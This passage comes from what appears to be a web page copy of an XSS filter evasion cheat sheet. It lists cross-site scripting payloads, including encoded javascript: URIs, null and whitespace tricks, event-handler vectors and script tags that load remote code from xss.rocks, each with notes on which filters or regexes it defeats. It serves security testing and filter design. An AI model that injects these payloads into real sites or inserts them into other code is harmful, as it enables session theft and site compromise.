</pre></table></code></div></div><h2 id="decimal-html-character-references">Decimal HTML Character References</h2><p>All of the XSS examples that use a javascript: directive inside of an &lt;IMG tag will not work in Firefox or Netscape 8.1+ in the Gecko rendering engine mode).</p><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">IMG</span> <span class="nx">SRC</span><span class="o">=&amp;</span><span class="err">#</span><span class="mi">106</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">97</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">118</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">97</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">115</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">99</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">114</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">105</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">112</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">116</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">58</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">97</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">108</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">101</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">114</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">116</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">40</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">39</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">88</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">83</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">83</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">39</span><span class="p">;</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">41</span><span class="p">;</span><span class="o">&gt;</span>
</pre></table></code></div></div><h2 id="decimal-html-character-references-without-trailing-semicolons">Decimal HTML Character References Without Trailing Semicolons</h2><p>This is often effective in XSS that attempts to look for <code class="language-plaintext highlighter-rouge">“&amp;#XX;”</code>, since most people don’t know about padding - up to 7 numeric characters total.</p><ul><li>This is also useful against people who decode against strings like <code class="language-plaintext highlighter-rouge">$tmp_string =~ s/.*\&amp;#(\d+);.*/$1/;</code> which incorrectly assumes a semicolon is required to terminate a html encoded string:</ul><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">IMG</span> <span class="nx">SRC</span><span class="o">=&amp;</span><span class="err">#</span><span class="mi">0000106</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">0000097</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">0000118</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">0000097</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">0000115</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">0000099</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">0000114</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">0000105</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">0000112</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">0000116</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">0000058</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">0000097</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">0000108</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">0000101</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">0000114</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">0000116</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">0000040</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">0000039</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">0000088</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">0000083</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">0000083</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">0000039</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">0000041</span><span class="o">&gt;</span>
</pre></table></code></div></div><h2 id="hexadecimal-html-character-references-without-trailing-semicolons">Hexadecimal HTML Character References Without Trailing Semicolons</h2><p>This is also a viable XSS attack against the above string <code class="language-plaintext highlighter-rouge">$tmp_string=~ s/.*\&amp;#(\d+);.*/$1/;</code> which assumes that there is a numeric character following the pound symbol - which is not true with hex HTML characters).</p><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">IMG</span> <span class="nx">SRC</span><span class="o">=&amp;</span><span class="err">#</span><span class="nx">x6A</span><span class="o">&amp;</span><span class="err">#</span><span class="nx">x61</span><span class="o">&amp;</span><span class="err">#</span><span class="nx">x76</span><span class="o">&amp;</span><span class="err">#</span><span class="nx">x61</span><span class="o">&amp;</span><span class="err">#</span><span class="nx">x73</span><span class="o">&amp;</span><span class="err">#</span><span class="nx">x63</span><span class="o">&amp;</span><span class="err">#</span><span class="nx">x72</span><span class="o">&amp;</span><span class="err">#</span><span class="nx">x69</span><span class="o">&amp;</span><span class="err">#</span><span class="nx">x70</span><span class="o">&amp;</span><span class="err">#</span><span class="nx">x74</span><span class="o">&amp;</span><span class="err">#</span><span class="nx">x3A</span><span class="o">&amp;</span><span class="err">#</span><span class="nx">x61</span><span class="o">&amp;</span><span class="err">#</span><span class="nx">x6C</span><span class="o">&amp;</span><span class="err">#</span><span class="nx">x65</span><span class="o">&amp;</span><span class="err">#</span><span class="nx">x72</span><span class="o">&amp;</span><span class="err">#</span><span class="nx">x74</span><span class="o">&amp;</span><span class="err">#</span><span class="nx">x28</span><span class="o">&amp;</span><span class="err">#</span><span class="nx">x27</span><span class="o">&amp;</span><span class="err">#</span><span class="nx">x58</span><span class="o">&amp;</span><span class="err">#</span><span class="nx">x53</span><span class="o">&amp;</span><span class="err">#</span><span class="nx">x53</span><span class="o">&amp;</span><span class="err">#</span><span class="nx">x27</span><span class="o">&amp;</span><span class="err">#</span><span class="nx">x29</span><span class="o">&gt;</span>
</pre></table></code></div></div><h2 id="embedded-tab">Embedded Tab</h2><p>Used to break up the cross site scripting attack:</p><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">IMG</span> <span class="nx">SRC</span><span class="o">=</span><span class="dl">"</span><span class="s2">javascript:alert('XSS');</span><span class="dl">"</span><span class="o">&gt;</span>
</pre></table></code></div></div><h2 id="embedded-encoded-tab">Embedded Encoded Tab</h2><p>Use this one to break up XSS :</p><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">IMG</span> <span class="nx">SRC</span><span class="o">=</span><span class="dl">"</span><span class="s2">jav&amp;#x09;ascript:alert('XSS');</span><span class="dl">"</span><span class="o">&gt;</span>
</pre></table></code></div></div><h2 id="embedded-newline-to-break-up-xss">Embedded Newline to Break-up XSS</h2><p>Some websites claim that any of the chars 09-13 (decimal) will work for this attack. That is incorrect. Only 09 (horizontal tab), 10 (newline) and 13 (carriage return) work. See the ascii chart for more details. The following four XSS examples illustrate this vector:</p><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">IMG</span> <span class="nx">SRC</span><span class="o">=</span><span class="dl">"</span><span class="s2">jav&amp;#x0A;ascript:alert('XSS');</span><span class="dl">"</span><span class="o">&gt;</span>
</pre></table></code></div></div><h2 id="embedded-carriage-return-to-break-up-xss">Embedded Carriage Return to Break-up XSS</h2><p>(Note: with the above I am making these strings longer than they have to be because the zeros could be omitted. Often I’ve seen filters that assume the hex and dec encoding has to be two or three characters. The real rule is 1-7 characters.):</p><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">IMG</span> <span class="nx">SRC</span><span class="o">=</span><span class="dl">"</span><span class="s2">jav&amp;#x0D;ascript:alert('XSS');</span><span class="dl">"</span><span class="o">&gt;</span>
</pre></table></code></div></div><h2 id="null-breaks-up-javascript-directive">Null breaks up JavaScript Directive</h2><p>Null chars also work as XSS vectors but not like above, you need to inject them</p><ul><li>directly using something like Burp Proxy<li>use <code class="language-plaintext highlighter-rouge">%00</code> in the URL string<li>write your own injection tool you can either use vim (<code class="language-plaintext highlighter-rouge">^V^@</code> will produce a null) or the following program to generate it into a text file.<li>older versions of Opera (circa 7.11 on Windows) were vulnerable to one additional char 173 (the soft hypen control char).<li>But the null char <code class="language-plaintext highlighter-rouge">%00</code> is much more useful and helped to bypass certain real world filters with a variation on this example:</ul><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nx">perl</span> <span class="o">-</span><span class="nx">e</span> <span class="dl">'</span><span class="s1">print "&lt;IMG SRC=java</span><span class="se">\</span><span class="s1">0script:alert(</span><span class="se">\</span><span class="s1">"XSS</span><span class="se">\</span><span class="s1">")&gt;";</span><span class="dl">'</span> <span class="o">&gt;</span> <span class="nx">out</span>
</pre></table></code></div></div><h2 id="spaces-and-meta-chars-before-the-javascript-in-images-for-xss">Spaces and Meta Chars Before the JavaScript in Images for XSS</h2><ul><li>This is useful if the pattern match doesn’t take into account spaces in the word javascript: -which is correct since that won’t render- and makes the false assumption that you can’t have a space between the quote and the javascript: keyword.<li>The actual reality is you can have any char from 1-32 in decimal:</ul><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">IMG</span> <span class="nx">SRC</span><span class="o">=</span><span class="dl">"</span><span class="s2"> &amp;#14; javascript:alert('XSS');</span><span class="dl">"</span><span class="o">&gt;</span>
</pre></table></code></div></div><h2 id="non-alpha-non-digit-xss">Non-alpha-non-digit XSS</h2><ul><li>The Firefox <code class="language-plaintext highlighter-rouge">HTML parser</code> assumes a non-alpha-non-digit is not valid after an HTML keyword and therefor considers it to be a whitespace or non-valid token after an HTML tag.<li>The problem is that some XSS filters assume that the tag they are looking for is broken up by whitespace.<li>For example</ul><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="err">\</span><span class="o">&lt;</span><span class="nx">SCRIPT</span><span class="err">\\</span><span class="nx">s</span> <span class="o">!=</span> <span class="err">\</span><span class="o">&lt;</span><span class="nx">SCRIPT</span><span class="o">/</span><span class="nx">XSS</span><span class="err">\\</span><span class="nx">s</span><span class="p">:</span>

<span class="o">&lt;</span><span class="nx">SCRIPT</span><span class="o">/</span><span class="nx">XSS</span> <span class="nx">SRC</span><span class="o">=</span><span class="dl">"</span><span class="s2">http网址xss.rocks/xss.js</span><span class="dl">"</span><span class="o">&gt;&lt;</span><span class="sr">/SCRIPT</span><span class="err">&gt;
</span></pre></table></code></div></div><p>Based on the same idea as above, however,expanded on it, using Rnake fuzzer. The Gecko rendering engine allows for any character other than letters, numbers or encapsulation chars (like quotes, angle brackets, etc…) between the event handler and the equals sign, making it easier to bypass cross site scripting blocks. Note that this also applies to the grave accent char as seen here:</p><div class="language-plaintext highlighter-rouge"><div class="code-header" text-data="plaintext"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>&lt;BjsODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert("XSS")&gt;
</pre></table></code></div></div><p>Yair Amit brought this to my attention that there is slightly different behavior between the IE and Gecko rendering engines that allows just a slash between the tag and the parameter with no spaces. This could be useful if the system does not allow spaces.</p><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">SCRIPT</span><span class="o">/</span><span class="nx">SRC</span><span class="o">=</span><span class="dl">"</span><span class="s2">http网址xss.rocks/xss.js</span><span class="dl">"</span><span class="o">&gt;&lt;</span><span class="sr">/SCRIPT</span><span class="err">&gt;
</span></pre></table></code></div></div><h2 id="extraneous-open-brackets">Extraneous Open Brackets</h2><p>Submitted by Franz Sedlmaier, this XSS vector could defeat certain detection engines that work by first using matching pairs of open and close angle brackets and then by doing a comparison of the tag inside, instead of a more efficient algorythm like Boyer-Moore that looks for entire string matches of the open angle bracket and associated tag (post de-obfuscation, of course). The double slash comments out the ending extraneous bracket to supress a JavaScript error:</p><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;&lt;</span><span class="nx">SCRIPT</span><span class="o">&gt;</span><span class="nf">alert</span><span class="p">(</span><span class="dl">"</span><span class="s2">XSS</span><span class="dl">"</span><span class="p">);</span><span class="c1">//\&lt;&lt;/SCRIPT&gt;</span>
</pre></table></code></div></div><h2 id="no-closing-script-tags">No Closing Script Tags</h2><p>In Firefox and Netscape 8.1 in the Gecko rendering engine mode you don’t actually need the &gt;&lt;/SCRIPT&gt; portion of this Cross Site Scripting vector. Firefox assumes it’s safe to close the HTML tag and add closing tags for you. How thoughtful! Unlike the next one, which doesn’t effect Firefox, this does not require any additional HTML below it. You can add quotes if you need to, but they’re not needed generally, although beware, I have no idea what the HTML will end up looking like once this is injected:</p><div class="language-plaintext highlighter-rouge"><div class="code-header" text-data="plaintext"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>&lt;SjsCRIPT SRC=http网址xss.rocks/xss.js?&lt; B &gt;
</pre></table></code></div></div><h2 id="protocol-resolution-in-script-tags">Protocol Resolution in Script Tags</h2><p>This particular variant was submitted by Łukasz Pilorz and was based partially off of Ozh’s protocol resolution bypass below. This cross site scripting example works in IE, Netscape in IE rendering mode and Opera if you add in a <code class="language-plaintext highlighter-rouge">&lt;/SCRIPT&gt;</code> tag at the end. However, this is especially useful where space is an issue, and of course, the shorter your domain, the better. The “.j” is valid, regardless of the encoding type because the browser knows it in context of a SCRIPT tag.</p><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">SCRIPT</span> <span class="nx">SRC</span><span class="o">=</span><span class="c1">//xss.rocks/.j&gt;</span>
</pre></table></code></div></div><h2 id="half-open-htmljavascript-xss-vector">Half Open HTML/JavaScript XSS Vector</h2><ul><li>Unlike Firefox the IE rendering engine doesn’t add extra data to you page, but it does allow the javascript: directive in images. This is useful as a vector because it doesn’t require a close angle bracket. This assumes there is any HTML tag below where you are injecting this cross site scripting vector. Even though there is no close <code class="language-plaintext highlighter-rouge">“&gt;”</code> tag the tags below it will close it.<li>A note: this does mess up the HTML, depending on what HTML is beneath it.<li>It gets around the following NIDS regex: <code class="language-plaintext highlighter-rouge">/((\\%3D)|(=))\[^\\n\]\*((\\%3C)|\&lt;)\[^\\n\]+((\\%3E)|\&gt;)/</code> because it doesn’t require the end <code class="language-plaintext highlighter-rouge">“&gt;”</code>. As a side note, this was also affective against a real world XSS filter I came across using an open ended <code class="language-plaintext highlighter-rouge">&lt;IFRAME</code> tag instead of an <code class="language-plaintext highlighter-rouge">&lt;IMG</code> tag:</ul><div class="language-plaintext highlighter-rouge"><div class="code-header" text-data="plaintext"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>&lt;IjsMG SRC="`('XSS')"`
</pre></table></code></div></div><h2 id="double-open-angle-brackets">Double Open Angle Brackets</h2><ul><li>Using an open angle bracket at the end of the vector instead of a close angle bracket causes different behavior in Netscape Gecko rendering.<li>Without it, Firefox will work but Netscape won’t:</ul><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">iframe</span> <span class="nx">src</span><span class="o">=</span><span class="nx">http网址xss</span><span class="p">.</span><span class="nx">rocks</span><span class="o">/</span><span class="nx">scriptlet</span><span class="p">.</span><span class="nx">html</span> <span class="o">&lt;</span>
</pre></table></code></div></div><h2 id="escaping-javascript-escapes">Escaping JavaScript Escapes</h2><ul><li>application output some user information inside of a JavaScript like the following:<ul><li><code class="language-plaintext highlighter-rouge">&lt;SCRIPT&gt;var a="$ENV{QUERY\_STRING}";&lt;/SCRIPT&gt;</code></ul><li>to inject your own JavaScript into it but the server side application escapes certain quotes you can circumvent that by escaping their escape character.<li>When this gets injected it will read<ul><li><code class="language-plaintext highlighter-rouge">&lt;SCRIPT&gt;var a="\\\\";alert('XSS');//";&lt;/SCRIPT&gt;</code><li>which ends up un-escaping the double quote and causing the Cross Site Scripting vector to fire.</ul><li>The XSS locator uses this method.:<ul><li><code class="language-plaintext highlighter-rouge">\";alert('XSS');//</code></ul><li>An alternative, if correct JSON or Javascript escaping has been applied to the embedded data but not HTML encoding, is to finish the script block and start your own:</ul><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="sr">/script&gt;&lt;script&gt;alert</span><span class="se">(</span><span class="sr">'XSS'</span><span class="se">)</span><span class="sr">;&lt;/</span><span class="nx">script</span><span class="o">&gt;</span>
</pre></table></code></div></div><h2 id="end-title-tag">End Title Tag</h2><p>This is a simple XSS vector that closes <code class="language-plaintext highlighter-rouge">&lt;TITLE&gt;</code> tags, which can encapsulate the malicious cross site scripting attack:</p><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="sr">/TITLE&gt;&lt;SCRIPT&gt;alert</span><span class="se">(</span><span class="sr">"XSS"</span><span class="se">)</span><span class="sr">;&lt;/</span><span class="nx">SCRIPT</span><span class="o">&gt;</span>
</pre></table></code></div></div><h2 id="input-image">INPUT Image</h2><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">INPUT</span> <span class="nx">TYPE</span><span class="o">=</span><span class="dl">"</span><span class="s2">IMAGE</span><span class="dl">"</span> <span class="nx">SRC</span><span class="o">=</span><span class="dl">"</span><span class="s2">javascript:alert('XSS');</span><span class="dl">"</span><span class="o">&gt;</span>
</pre></table></code></div></div><h2 id="body-image">BODY Image</h2><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">BODY</span> <span class="nx">BACKGROUND</span><span class="o">=</span><span class="dl">"</span><span class="s2">javascript:alert('XSS')</span><span class="dl">"</span><span class="o">&gt;</span>
</pre></table></code></div></div><h2 id="img-dynsrc">IMG Dynsrc</h2><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">IMG</span> <span class="nx">DYNSRC</span><span class="o">=</span><span class="dl">"</span><span class="s2">javascript:alert('XSS')</span><span class="dl">"</span><span class="o">&gt;</span>
</pre></table></code></div></div><h2 id="img-lowsrc">IMG Lowsrc</h2><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">IMG</span> <span class="nx">LOWSRC</span><span class="o">=</span><span class="dl">"</span><span class="s2">javascript:alert('XSS')</span><span class="dl">"</span><span class="o">&gt;</span>
</pre></table></code></div></div><h2 id="list-style-image">List-style-image</h2><p>Fairly esoteric issue dealing with embedding images for bulleted lists. This will only work in the IE rendering engine because of the JavaScript directive. Not a particularly useful cross site scripting vector:</p><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">STYLE</span><span class="o">&gt;</span><span class="nx">li</span> <span class="p">{</span><span class="nx">list</span><span class="o">-</span><span class="nx">style</span><span class="o">-</span><span class="nx">image</span><span class="p">:</span> <span class="nf">url</span><span class="p">(</span><span class="dl">"</span><span class="s2">javascript:alert('XSS')</span><span class="dl">"</span><span class="p">);}</span><span class="o">&lt;</span><span class="sr">/STYLE</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="nx">UL</span><span class="o">&gt;&lt;</span><span class="nx">LI</span><span class="o">&gt;</span><span class="nx">XSS</span><span class="o">&lt;</span><span class="sr">/br</span><span class="err">&gt;
</span></pre></table></code></div></div><h2 id="vbscript-in-an-image">VBscript in an Image</h2><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">IMG</span> <span class="nx">SRC</span><span class="o">=</span><span class="dl">'</span><span class="s1">vbscript:msgbox("XSS")</span><span class="dl">'</span><span class="o">&gt;</span>
</pre></table></code></div></div><h2 id="livescript-older-versions-of-netscape-only">Livescript (older versions of Netscape only)</h2><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">IMG</span> <span class="nx">SRC</span><span class="o">=</span><span class="dl">"</span><span class="s2">livescript:[code]</span><span class="dl">"</span><span class="o">&gt;</span>
</pre></table></code></div></div><h2 id="svg-object-tag">SVG Object Tag</h2><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">svg</span><span class="o">/</span><span class="nx">onload</span><span class="o">=</span><span class="nf">alert</span><span class="p">(</span><span class="dl">'</span><span class="s1">XSS</span><span class="dl">'</span><span class="p">)</span><span class="o">&gt;</span>
</pre></table></code></div></div><h2 id="ecmascript-6">ECMAScript 6</h2><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">Set</span><span class="p">.</span><span class="kd">constructor</span><span class="s2">`alert\x28document.domain\x29
</span></pre></table></code></div></div><h2 id="body-tag">BODY Tag</h2><p>Method doesn’t require using any variants of javascript: or <code class="language-plaintext highlighter-rouge">&lt;SCRIPT</code>… to accomplish the XSS attack). Dan Crowley additionally noted that you can put a space before the equals sign <code class="language-plaintext highlighter-rouge">(onload= != onload =)</code>:</p><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">BODY</span> <span class="nx">ONLOAD</span><span class="o">=</span><span class="nf">alert</span><span class="p">(</span><span class="dl">'</span><span class="s1">XSS</span><span class="dl">'</span><span class="p">)</span><span class="o">&gt;</span>
</pre></table></code></div></div><h2 id="event-handlers">Event Handlers</h2><p>It can be used in similar XSS attacks to the one above (this is the most comprehensive list on the net, at the time of this writing). Thanks to Rene Ledosquet for the HTML+TIME updates.</p><p>The Dottoro Web Reference also has a nice list of events in JavaScript.</p><div class="language-plaintext highlighter-rouge"><div class="code-header" text-data="plaintext"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
</pre><td class="rouge-code"><pre>FSCommand() (attacker can use this when executed from within an embedded Flash object)
onAbort() (when user aborts the loading of an image)
onActivate() (when object is set as the active element)
onAfterPrint() (activates after user prints or previews print job)
onAfterUpdate() (activates on data object after updating data in the source object)
onBeforeActivate() (fires before the object is set as the active element)
onBeforeCopy() (attacker executes the attack string right before a selection is copied to the clipboard - attackers can do this with the execCommand("Copy") function)
onBeforeCut() (attacker executes the attack string right before a selection is cut)
onBeforeDeactivate() (fires right after the activeElement is changed from the current object)
onBeforeEditFocus() (Fires before an object contained in an editable element enters a UI-activated state or when an editable container object is control selected)
onBeforePaste() (user needs to be tricked into pasting or be forced into it using the execCommand("Paste") function)
onBeforePrint() (user would need to be tricked into printing or attacker could use the print() or execCommand("Print") function).
onBeforeUnload() (user would need to be tricked into closing the browser - attacker cannot unload windows unless it was spawned from the parent)
onBeforeUpdate() (activates on data object before updating data in the source object)
onBegin() (the onbegin event fires immediately when the element’s timeline begins)
onBlur() (in the case where another popup is loaded and window looses focus)
onBounce() (fires when the behavior property of the marquee object is set to “alternate” and the contents of the marquee reach one side of the window)
onCellChange() (fires when data changes in the data provider)
onChange() (select, text, or TEXTAREA field loses focus and its value has been modified)
onClick() (someone clicks on a form)
onContextMenu() (user would need to right click on attack area)
onControlSelect() (fires when the user is about to make a control selection of the object)
onCopy() (user needs to copy something or it can be exploited using the execCommand("Copy") command)
onCut() (user needs to copy something or it can be exploited using the execCommand("Cut") command)
onDataAvailable() (user would need to change data in an element, or attacker could perform the same function)
onDataSetChanged() (fires when the data set exposed by a data source object changes)
onDataSetComplete() (fires to indicate that all data is available from the data source object)
onDblClick() (user double-clicks a form element or a link)
onDeactivate() (fires when the activeElement is changed from the current object to another object in the parent document)
